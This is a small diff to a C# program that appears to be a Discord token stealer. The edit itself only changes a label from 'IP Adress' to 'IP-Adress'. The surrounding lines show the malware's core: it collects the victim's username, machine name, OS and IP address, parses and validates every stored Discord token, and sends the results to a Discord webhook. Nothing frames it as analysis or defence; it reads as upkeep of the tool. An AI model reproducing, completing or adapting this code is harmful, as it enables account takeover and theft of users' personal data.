@@ -10,7 +10,7 @@ public static class Program
             .AppendLine($"Username: {Environment.UserName}")
             .AppendLine($"Machine Name: {Environment.MachineName}")
             .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
-            .AppendLine($"IP Adress: {await IPInfo.GetAddress()}")
+            .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
             .AppendLine("Tokens: ");
         await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await ValidateToken(content, token, cts));
         using DiscordWebhook webhook = new("https://canary.discord.com/api/webhooks/{webhook.id}/{webhook.token}");
